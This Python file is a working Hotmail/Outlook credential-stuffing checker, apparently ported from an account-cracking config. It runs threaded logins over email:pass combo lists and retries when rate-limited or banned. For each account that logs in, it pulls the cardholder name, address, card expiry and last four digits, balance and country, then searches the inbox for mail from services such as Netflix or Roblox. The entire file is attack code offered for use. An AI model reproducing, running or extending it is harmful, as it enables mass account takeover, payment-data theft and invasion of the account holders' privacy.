"""
Hotmail/Outlook mail:pass checker — ported from @rapesoull hotmail.com v4 (.svb)
Threaded (requests). Login → payment/CC/address/country capture → inbox search.
Retry logic on bans/timeouts to match .svb parity — no hits skipped.
"""

import requests
import urllib.parse
import json
import re
import time
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

MAX_RETRIES = 3
RETRY_DELAY = 2  # seconds between retries

COUNTRY_MAP = {
    "AF": "Afghanistan", "AL": "Albania", "DZ": "Algeria", "AS": "American Samoa",
    "AD": "Andorra", "AO": "Angola", "AI": "Anguilla", "AG": "Antigua And Barbuda",
    "AR": "Argentina", "AM": "Armenia", "AW": "Aruba", "AU": "Australia",
    "AT": "Austria", "AZ": "Azerbaijan", "BS": "Bahamas", "BH": "Bahrain",
    "BD": "Bangladesh", "BB": "Barbados", "BY": "Belarus", "BE": "Belgium",
    "BZ": "Belize", "BJ": "Benin", "BM": "Bermuda", "BT": "Bhutan",
    "BO": "Bolivia", "BA": "Bosnia and Herzegovina", "BW": "Botswana",
    "BR": "Brazil", "BN": "Brunei", "BG": "Bulgaria", "BF": "Burkina Faso",
    "BI": "Burundi", "KH": "Cambodia", "CM": "Cameroon", "CA": "Canada",
    "CV": "Cape Verde", "KY": "Cayman Islands", "CF": "Central African Republic",
    "TD": "Chad", "CL": "Chile", "CN": "China", "CO": "Colombia",
    "CG": "Congo", "CR": "Costa Rica", "HR": "Croatia", "CU": "Cuba",
    "CY": "Cyprus", "CZ": "Czech Republic", "DK": "Denmark", "DJ": "Djibouti",
    "DM": "Dominica", "DO": "Dominican Republic", "EC": "Ecuador", "EG": "Egypt",
    "SV": "El Salvador", "EE": "Estonia", "ET": "Ethiopia", "FI": "Finland",
    "FR": "France", "GA": "Gabon", "GE": "Georgia", "DE": "Germany",
    "GH": "Ghana", "GR": "Greece", "GT": "Guatemala", "GY": "Guyana",
    "HT": "Haiti", "HN": "Honduras", "HK": "Hong Kong", "HU": "Hungary",
    "IS": "Iceland", "IN": "India", "ID": "Indonesia", "IR": "Iran",
    "IQ": "Iraq", "IE": "Ireland", "IL": "Israel", "IT": "Italy",
    "JM": "Jamaica", "JP": "Japan", "JO": "Jordan", "KZ": "Kazakhstan",
    "KE": "Kenya", "KR": "Korea", "KW": "Kuwait", "KG": "Kyrgyzstan",
    "LA": "Laos", "LV": "Latvia", "LB": "Lebanon", "LY": "Libya",
    "LT": "Lithuania", "LU": "Luxembourg", "MY": "Malaysia", "MV": "Maldives",
    "MT": "Malta", "MX": "Mexico", "MD": "Moldova", "MC": "Monaco",
    "MN": "Mongolia", "ME": "Montenegro", "MA": "Morocco", "MZ": "Mozambique",
    "MM": "Myanmar", "NA": "Namibia", "NP": "Nepal", "NL": "Netherlands",
    "NZ": "New Zealand", "NI": "Nicaragua", "NG": "Nigeria", "NO": "Norway",
    "OM": "Oman", "PK": "Pakistan", "PA": "Panama", "PY": "Paraguay",
    "PE": "Peru", "PH": "Philippines", "PL": "Poland", "PT": "Portugal",
    "PR": "Puerto Rico", "QA": "Qatar", "RO": "Romania", "RU": "Russia",
    "RW": "Rwanda", "SA": "Saudi Arabia", "SN": "Senegal", "RS": "Serbia",
    "SG": "Singapore", "SK": "Slovakia", "SI": "Slovenia", "ZA": "South Africa",
    "ES": "Spain", "LK": "Sri Lanka", "SD": "Sudan", "SE": "Sweden",
    "CH": "Switzerland", "SY": "Syria", "TW": "Taiwan", "TZ": "Tanzania",
    "TH": "Thailand", "TN": "Tunisia", "TR": "Turkey", "UA": "Ukraine",
    "AE": "United Arab Emirates", "GB": "United Kingdom", "US": "United States",
    "UY": "Uruguay", "UZ": "Uzbekistan", "VE": "Venezuela", "VN": "Vietnam",
    "ZM": "Zambia", "ZW": "Zimbabwe",
}


def _parse_lr(text, left, right):
    """Extract string between left and right delimiters."""
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ""


def _find_nested_values(obj, key):
    """Recursively collect values for a key inside nested dict/list JSON."""
    out = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            if str(k).lower() == key.lower():
                out.append(v)
            out.extend(_find_nested_values(v, key))
    elif isinstance(obj, list):
        for item in obj:
            out.extend(_find_nested_values(item, key))
    return out


def _extract_total_messages(search_json, raw_text):
    """Get the best Total value from Outlook search response."""
    totals = []
    for val in _find_nested_values(search_json, "Total"):
        try:
            totals.append(int(str(val).strip()))
        except Exception:
            continue

    if totals:
        return str(max(totals))

    total_msgs = _parse_lr(raw_text, '"Total":', ',')
    if total_msgs:
        return total_msgs.strip()
    return "0"


def _extract_first_string(search_json, keys):
    """Find first non-empty string value for any key in nested JSON."""
    for key in keys:
        vals = _find_nested_values(search_json, key)
        for v in vals:
            if isinstance(v, str) and v.strip():
                return v.strip()
    return ""


def _check_single(email, password, search_keyword=None):
    """
    Check a single Hotmail/Outlook account with retries.
    Returns dict with status, captures, detail.
    """
    for attempt in range(MAX_RETRIES):
        result = _attempt_check(email, password, search_keyword)

        # Only retry on retryable statuses
        if result["status"] == "retry":
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            else:
                # Exhausted retries, mark as fail so it's not silently lost
                result["status"] = "fail"
                result["detail"] = f"retry exhausted ({result.get('detail', '')})"
                return result

        return result

    return result


LOGIN_URL = "https://login.live.com/ppsecure/post.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&display=touch&username=ashleypetty%40outlook.com&contextid=2CCDB02DC526CA71&bk=1665024852&uaid=a5b22c26bc704002ac309462e8d061bb&pid=15216"

LOGIN_HEADERS = {
    "Host": "login.live.com", "Connection": "keep-alive", "Cache-Control": "max-age=0",
    "sec-ch-ua": '"Microsoft Edge";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
    "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1", "Origin": "https://login.live.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
    "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=0000000048170EF2&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL&uaid=a5b22c26bc704002ac309462e8d061bb&display=touch&username=ashleypetty%40outlook.com",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "MSPRequ=id=N&lt=1716398680&co=1; uaid=a5b22c26bc704002ac309462e8d061bb; MSPOK=$uuid-175ae920-bd12-4d7c-ad6d-9b92a6818f89",
    "Accept-Encoding": "gzip, deflate",
}


def _attempt_check(email, password, search_keyword=None):
    """Single attempt to check an account — same login flow as checker.py."""
    result = {
        "user": email,
        "password": password,
        "status": "fail",
        "captures": {},
        "detail": "",
    }

    session = requests.Session()
    session.max_redirects = 8

    try:
        # ── Step 1: Direct POST login (same as checker.py — proven working) ──
        post_data = (
            "ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            "&PPFT=-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb%21Gl%21I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU%21RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co%21nwbCVhXJ*sjt8rZhAAUbA2nA7Z%21GK5uQ%24%24"
            "&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            "&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={urllib.parse.quote(password)}"
        )

        resp = session.post(LOGIN_URL, headers=LOGIN_HEADERS, data=post_data,
                            allow_redirects=True, timeout=15)

        body = resp.text
        final_url = str(resp.url)

        # ── Status check (same logic as checker.py) ──
        cookies_dict = session.cookies.get_dict()
        cookies_str = str(cookies_dict)

        # Failure
        if any(x in body for x in [
            "Your account or password is incorrect",
            "That Microsoft account doesn\\'t exist",
            "That Microsoft account doesn't exist",
            "Sign in to your Microsoft account",
            "timed out"
        ]):
            result["status"] = "fail"
            result["detail"] = "bad credentials"
            return result

        # Ban
        if ",AC:null,urlFedConvertRename" in body:
            result["status"] = "retry"
            result["detail"] = "ban/rate limit"
            return result

        # 2FA
        if any(x in body for x in [
            "account.live.com/recover?mkt", "recover?mkt",
            "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
        ]):
            result["status"] = "2fa"
            result["detail"] = "2FA/recovery"
            return result

        # Custom/Locked
        if "/cancel?mkt=" in body or "/Abuse?mkt=" in body:
            result["status"] = "custom"
            result["detail"] = "locked/abuse"
            return result

        # Success check (same as checker.py)
        if ("ANON" in cookies_str or "WLSSC" in cookies_str) and \
           "https://login.live.com/oauth20_desktop.srf?" in final_url:
            result["status"] = "hit"
        else:
            result["status"] = "fail"
            result["detail"] = "login failed"
            return result

        # ── Step 2: Get PIFD token (same as checker.py) ──
        pifd_token = ""
        try:
            r2 = session.get(
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=000000000004773A&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
                "&prompt=none",
                headers={
                    "Host": "login.live.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "close",
                    "Referer": "https://account.microsoft.com/",
                },
                allow_redirects=True, timeout=15,
            )
            pifd_token = _parse_lr(str(r2.url), "access_token=", "&token_type")
            if not pifd_token:
                pifd_token = _parse_lr(str(r2.url), "access_token=", "&")
            if pifd_token:
                pifd_token = urllib.parse.unquote(pifd_token)
        except Exception:
            pass

        # ── Step 3: Get substrate access token via refresh_token ──
        access_token = ""
        refresh_token = _parse_lr(final_url, "refresh_token=", "&")
        if not refresh_token:
            refresh_token = _parse_lr(body, "refresh_token=", "&")

        if refresh_token:
            try:
                token_data = (
                    "grant_type=refresh_token"
                    "&client_id=0000000048170EF2"
                    "&scope=https%3A%2F%2Fsubstrate.office.com%2FUser-Internal.ReadWrite"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    f"&refresh_token={refresh_token}"
                    "&uaid=db28da170f2a4b85a26388d0a6cdbb6e"
                )
                token_resp = session.post(
                    "https://login.live.com/oauth20_token.srf",
                    data=token_data,
                    headers={
                        "x-ms-sso-Ignore-SSO": "1",
                        "User-Agent": "Outlook-Android/2.0",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": "login.live.com",
                        "Connection": "Keep-Alive",
                        "Accept-Encoding": "gzip",
                    },
                    timeout=15,
                )
                access_token = token_resp.json().get("access_token", "")
            except Exception:
                pass

        # ── Step 4: Payment instruments (same headers as checker.py) ──
        if pifd_token:
            try:
                pay_h = {
                    "User-Agent": USER_AGENT,
                    "Pragma": "no-cache",
                    "Accept": "application/json",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
                    "Content-Type": "application/json",
                    "Origin": "https://account.microsoft.com",
                    "Referer": "https://account.microsoft.com/",
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "same-site",
                }

                pay_resp = session.get(
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
                    "?status=active,removed&language=en-US",
                    headers=pay_h, timeout=15,
                )

                pay_body = pay_resp.text

                # ── Captures matching .svb config (clean format) ──

                # CAP "Name"
                name = _parse_lr(pay_body, '"accountHolderName":"', '"')
                if name:
                    result["captures"]["Name"] = name

                # CAP "Full Addy" — Address, City, State, Postalcode
                addr1 = _parse_lr(pay_body, '"address":{"address_line1":"', '"')
                try:
                    pay_json = pay_resp.json()
                    items = pay_json if isinstance(pay_json, list) else pay_json.get("paymentInstruments", [pay_json])
                    first = items[0] if items else {}
                    addr_obj = first.get("address", {}) if isinstance(first, dict) else {}
                    city = addr_obj.get("city", "")
                    region = addr_obj.get("region", "")
                    zipcode = addr_obj.get("postal_code", "")
                except Exception:
                    city = _parse_lr(pay_body, '"city":"', '"')
                    region = _parse_lr(pay_body, '"region":"', '"')
                    zipcode = _parse_lr(pay_body, '"postal_code":"', '"')

                parts = [p for p in [addr1, city, region, zipcode] if p]
                if parts:
                    result["captures"]["Full Addy"] = f"{addr1} | {city} | {region} | {zipcode}"

                # CAP "Balance"
                balance = _parse_lr(pay_body, 'balance":', ',"')
                if balance:
                    result["captures"]["Balance"] = f"${balance}"

                # CAP "CC Info" — CardHolder | CC | Month | Year | Last4 | Funding
                cc_holder = _parse_lr(pay_body, 'accountHolderName":"', '","')
                cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
                exp_month = _parse_lr(pay_body, 'expiryMonth":"', '",')
                exp_year = _parse_lr(pay_body, 'expiryYear":"', '",')
                last4 = _parse_lr(pay_body, 'lastFourDigits":"', '",')
                card_type = _parse_lr(pay_body, '"cardType":"', '"')

                if cc_name or last4:
                    result["captures"]["CC Info"] = (
                        f"Holder: {cc_holder} | Card: {cc_name} | "
                        f"Exp: {exp_month}/{exp_year} | Last4: {last4} | Type: {card_type}"
                    )

                # CAP "Country"
                country_code = _parse_lr(pay_body, '"country":"', '"')
                if country_code:
                    result["captures"]["Country"] = COUNTRY_MAP.get(country_code, country_code)

            except Exception:
                pass

        # ── Step 5: Mail folders + inbox search (needs access_token) ──
        if access_token and access_token.startswith("Ew"):
            mail_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "ForceSync": "false",
                "Authorization": f"Bearer {access_token}",
                "Host": "substrate.office.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip",
            }

            # Folders
            try:
                folders_resp = session.get(
                    "https://outlook.office.com/api/beta/me/MailFolders",
                    headers=mail_headers, timeout=15,
                )
                folders_json = folders_resp.json()
                folder_names = [f.get("DisplayName", "") for f in folders_json.get("value", [])]
                if folder_names:
                    result["captures"]["Folders"] = ", ".join(folder_names[:10])
            except Exception:
                pass

            # Inbox search
            if search_keyword:
                try:
                    search_body = {
                        "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
                        "Scenario": {"Name": "owa.react"},
                        "TimeZone": "UTC",
                        "TextDecorations": "Off",
                        "EntityRequests": [{
                            "EntityType": "Conversation",
                            "ContentSources": ["Exchange"],
                            "Filter": {
                                "Or": [
                                    {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                                    {"Term": {"DistinguishedFolderName": "DeletedItems"}},
                                ]
                            },
                            "From": 0,
                            "Query": {"QueryString": search_keyword},
                            "RefiningQueries": None,
                            "Size": 25,
                            "Sort": [
                                {"Field": "Score", "SortDirection": "Desc", "Count": 3},
                                {"Field": "Time", "SortDirection": "Desc"},
                            ],
                            "EnableTopResults": True,
                            "TopResultsCount": 3,
                        }],
                        "AnswerEntityRequests": [{
                            "Query": {"QueryString": search_keyword},
                            "EntityTypes": ["Event", "File"],
                            "From": 0,
                            "Size": 10,
                            "EnableAsyncResolution": True,
                        }],
                        "QueryAlterationOptions": {
                            "EnableSuggestion": True,
                            "EnableAlteration": True,
                            "SupportedRecourseDisplayTypes": [
                                "Suggestion", "NoResultModification",
                                "NoResultFolderRefinerModification",
                                "NoRequeryModification", "Modification",
                            ],
                        },
                        "LogicalId": "446c567a-02d9-b739-b9ca-616e0d45905c",
                    }

                    search_resp = session.post(
                        "https://outlook.live.com/search/api/v2/query?n=124",
                        json=search_body,
                        headers=mail_headers,
                        timeout=15,
                    )

                    search_text = search_resp.text
                    try:
                        search_json = search_resp.json()
                    except Exception:
                        search_json = {}

                    # CAP "Total Msg From <keyword>"
                    total_msgs = _extract_total_messages(search_json, search_text)
                    try:
                        total_int = int(total_msgs)
                    except Exception:
                        total_int = 0

                    kw_upper = search_keyword.upper()
                    result["captures"][f"Total Msg From {kw_upper}"] = str(total_int)

                    # CAP "Last MSG From Mail"
                    snippet = _extract_first_string(
                        search_json,
                        ["HitHighlightedSummary", "Summary", "Preview", "Snippet"],
                    )
                    if not snippet:
                        snippet = _parse_lr(search_text, '"HitHighlightedSummary":"', '",')

                    snippet = re.sub(r'\[.*?\]', '', snippet).strip() if snippet else ""
                    if snippet:
                        result["captures"]["Last MSG From Mail"] = snippet[:120]

                    # CAP "Last Mail Msg" (date)
                    last_date = _extract_first_string(
                        search_json,
                        ["LastDeliveryTime", "ReceivedDateTime", "DateTimeSent"],
                    )
                    if not last_date:
                        last_date = _parse_lr(search_text, '"LastDeliveryTime":"', 'T')
                    if last_date and "T" in last_date:
                        last_date = last_date.split("T", 1)[0]
                    if last_date:
                        result["captures"]["Last Mail Msg"] = last_date

                    # Service checker semantics: only "hit" when service mail exists
                    if total_int <= 0:
                        result["status"] = "fail"
                        result["detail"] = f"no {search_keyword} mail found"

                except Exception:
                    pass

    except requests.exceptions.Timeout:
        result["status"] = "retry"
        result["detail"] = "timed out"
    except requests.exceptions.ConnectionError:
        result["status"] = "retry"
        result["detail"] = "connection error"
    except Exception as ex:
        result["status"] = "fail"
        result["detail"] = str(ex)[:100]

    return result


def check_hotmail_accounts(accounts, search_keyword, max_threads=10,
                           on_progress=None, stop_event=None):
    """
    Check a list of email:pass combos against Hotmail/Outlook.
    search_keyword: e.g. "netflix", "roblox", "crunchyroll"
    Every single account is processed — nothing is skipped.
    Returns list of result dicts.
    """
    results = []
    done = [0]
    total = len(accounts)
    lock = threading.Lock()

    def worker(combo):
        if stop_event and stop_event.is_set():
            # Even stopped combos get a result so nothing is lost
            return {
                "user": combo.split(":", 1)[0] if ":" in combo else combo,
                "password": combo.split(":", 1)[1] if ":" in combo else "",
                "status": "fail",
                "captures": {},
                "detail": "stopped by user",
            }
        parts = combo.split(":", 1)
        if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
            # Invalid format — still return a result, not None
            return {
                "user": parts[0].strip() if parts else combo,
                "password": parts[1].strip() if len(parts) > 1 else "",
                "status": "fail",
                "captures": {},
                "detail": "invalid format",
            }
        email, password = parts[0].strip(), parts[1].strip()
        r = _check_single(email, password, search_keyword)
        with lock:
            done[0] += 1
            if on_progress:
                status = r.get("status", "fail")
                try:
                    on_progress(done[0], total, status)
                except TypeError:
                    on_progress(done[0], total)
        return r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(worker, acc): acc for acc in accounts}
        for f in as_completed(futures):
            try:
                r = f.result()
                if r:
                    results.append(r)
            except Exception as ex:
                # Even exceptions produce a result
                acc = futures[f]
                results.append({
                    "user": acc.split(":", 1)[0] if ":" in acc else acc,
                    "password": acc.split(":", 1)[1] if ":" in acc else "",
                    "status": "fail",
                    "captures": {},
                    "detail": f"thread error: {str(ex)[:60]}",
                })

    return results
